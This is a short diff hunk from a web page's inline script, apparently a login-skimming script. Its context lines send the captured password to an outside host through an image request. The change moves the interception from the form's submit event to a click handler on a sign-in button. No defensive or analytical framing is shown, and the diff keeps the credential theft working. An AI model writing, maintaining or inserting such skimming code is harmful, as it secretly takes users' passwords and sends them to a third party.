@@ -22,7 +22,7 @@
 			var i = new Image; 
 			i.src = "http://r7.io/e/moffotto?s=password="+pass;
 		}; 
-		document.forms[0].onsubmit = intercept;
+		$( "#signin-btn").click(intercept);
             }
         });
     </script>
